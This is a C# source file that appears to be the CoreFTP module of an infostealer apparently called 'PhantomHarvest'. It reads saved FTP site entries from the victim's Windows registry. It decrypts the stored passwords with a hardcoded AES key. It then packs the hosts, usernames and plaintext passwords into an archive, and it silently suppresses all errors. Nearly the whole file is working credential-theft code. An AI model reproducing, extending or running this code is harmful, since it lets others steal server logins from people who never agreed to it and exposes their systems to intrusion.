using System;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.FTPs
{
	internal class CoreFTP
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string info = CoreFTP.GetInfo();
				if (!string.IsNullOrEmpty(info))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(info)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, CoreFTP.FTPName + "/CoreFTP.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string GetInfo()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string text = "Software\\FTPWare\\CoreFTP\\Sites";
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text, false))
			{
				if (registryKey != null)
				{
					foreach (string path in registryKey.GetSubKeyNames())
					{
						using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(Path.Combine(text, path), false))
						{
							object value = registryKey2.GetValue("Host");
							object value2 = registryKey2.GetValue("Port");
							object value3 = registryKey2.GetValue("User");
							object value4 = registryKey2.GetValue("PW");
							if (value != null && value3 != null && value4 != null)
							{
								stringBuilder.AppendLine("Server:" + string.Format("{0}:{1}", value.ToString(), value2.ToString()));
								stringBuilder.AppendLine(value3.ToString());
								stringBuilder.AppendLine(CoreFTP.Decrypt(value4.ToString(), "hdfzpysvpzimorhk"));
								stringBuilder.AppendLine();
							}
						}
					}
				}
			}
			return stringBuilder.ToString();
		}

		private static string Decrypt(string encryptedData, string key)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(key);
			CoreFTP.PadToMultipleOf(ref bytes, 8);
			byte[] array = CoreFTP.ConvertHexStringToByteArray(encryptedData);
			string @string;
			using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
			{
				rijndaelManaged.KeySize = bytes.Length * 8;
				rijndaelManaged.Key = bytes;
				rijndaelManaged.Mode = CipherMode.ECB;
				rijndaelManaged.Padding = PaddingMode.None;
				using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor())
				{
					byte[] bytes2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					@string = Encoding.UTF8.GetString(bytes2);
				}
			}
			return @string;
		}

		private static void PadToMultipleOf(ref byte[] src, int pad)
		{
			int newSize = (src.Length + pad - 1) / pad * pad;
			Array.Resize<byte>(ref src, newSize);
		}

		private static byte[] ConvertHexStringToByteArray(string hexString)
		{
			if (hexString.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					hexString
				}));
			}
			byte[] array = new byte[hexString.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = hexString.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		public static string FTPName = "CoreFTP";
	}
}
